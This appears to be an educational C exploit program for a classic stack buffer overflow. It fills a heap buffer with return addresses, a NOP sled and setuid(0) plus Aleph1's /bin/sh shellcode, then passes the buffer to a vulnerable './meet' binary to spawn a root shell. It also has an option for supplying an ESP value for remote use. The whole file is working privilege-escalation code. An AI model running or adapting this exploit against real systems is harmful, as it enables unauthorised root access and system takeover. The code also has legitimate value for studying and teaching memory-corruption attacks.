#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char shellcode[] =  // setuid(0) & Aleph1's famous shellcode.
      "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"  //setuid(0) first
      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
      "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";
// Small function to retrieve the current esp value (only works locally)
unsigned long get_sp(void){
   __asm__("movl %esp, %eax");
}
int main(int argc, char *argv[1]) {      // main function
   int i, offset = 0;                    // used to count/subtract later
   unsigned int esp, ret, *addr_ptr;     // used to save addresses
   char *buffer, *ptr;                   // two strings: buffer, ptr
   int size = 500;                       // default buffer size

   esp = get_sp();                       // get local esp value
   if(argc > 1) size = atoi(argv[1]);    // if 1 argument, store to size
   if(argc > 2) offset = atoi(argv[2]);  // if 2 arguments, store offset
   if(argc > 3) esp = strtoul(argv[3],NULL,0); //used for remote exploits
   ret = esp - offset;  // calc default value of return

   // print directions for use
   fprintf(stderr,"Usage: %s<buff_size> <offset> <esp:0xfff...>\n", argv[0]);        // print feedback of operation
   fprintf(stderr,"ESP:0x%x  Offset:0x%x  Return:0x%x\n",esp,offset,ret);
   buffer = (char *)malloc(size);     // allocate buffer on heap
   ptr = buffer;  // temp pointer, set to location of buffer
   addr_ptr = (unsigned int *) ptr;   // temp addr_ptr, set to location of ptr
   // Fill entire buffer with return addresses, ensures proper alignment
   for(i=0; i < size; i+=4){          // notice increment of 4 bytes for addr
       *(addr_ptr++) = ret;           // use addr_ptr to write into buffer
   }
   //Fill 1st half of exploit buffer with NOPs
   for(i=0; i < size/2; i++){         // notice, we only write up to half of size
      buffer[i] = '\x90';             // place NOPs in the first half of buffer
   }
   // Now, place shellcode
   ptr = buffer + size/2;             // set the temp ptr at half of buffer size
   for(i=0; i < strlen(shellcode); i++){ // write 1/2 of buffer til end of sc
      *(ptr++) = shellcode[i];        // write the shellcode into the buffer
   }
   // Terminate the string
   buffer[size-1]=0;                  // This is so our buffer ends with a x\0
   // Now, call the vulnerable program with buffer as 2nd argument.
   execl("./meet", "meet", "Mr.",buffer,0);// the list of args is ended w/0
   printf("%s\n",buffer);  // used for remote exploits
   //Free up the heap
   free(buffer);                      // play nicely
   return 0;                          // exit gracefully
}